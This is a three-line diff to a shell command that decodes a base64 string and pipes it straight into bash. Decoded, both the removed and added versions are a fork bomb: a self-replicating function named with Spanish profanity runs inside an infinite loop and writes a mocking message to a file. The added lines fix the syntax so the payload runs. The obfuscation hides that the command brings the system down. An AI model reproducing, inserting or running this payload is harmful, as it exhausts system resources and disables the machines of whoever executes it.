@@ -1,3 +1,3 @@
-echo 'cHV0YW1pZXJkYSgpeyBwdXRhbWllcmRhfHB1dGFtaWVyZGEmIH07IHdoaWxlIHRydWU7IGRvOyBl
-Y2hvICdKYWphIHB1dGFtaWVyZGEnID4gJ3B1dGEgbWllcmRhJzsgcHV0YW1pZXJkYTsgZWNobyBw
-dXRhbWllcmRhOyBkb25lCg==' | base64 -d | bash
+echo 'cHV0YW1pZXJkYSgpeyBwdXRhbWllcmRhfHB1dGFtaWVyZGEmIH07IHdoaWxlIHRydWU7IGRvIGVj
+aG8gSmFqYSBwdXRhbWllcmRhID4gcHV0YSBtaWVyZGE7IHB1dGFtaWVyZGE7IGVjaG8gcHV0YW1p
+ZXJkYTsgZG9uZQo=' | base64 -d | bash
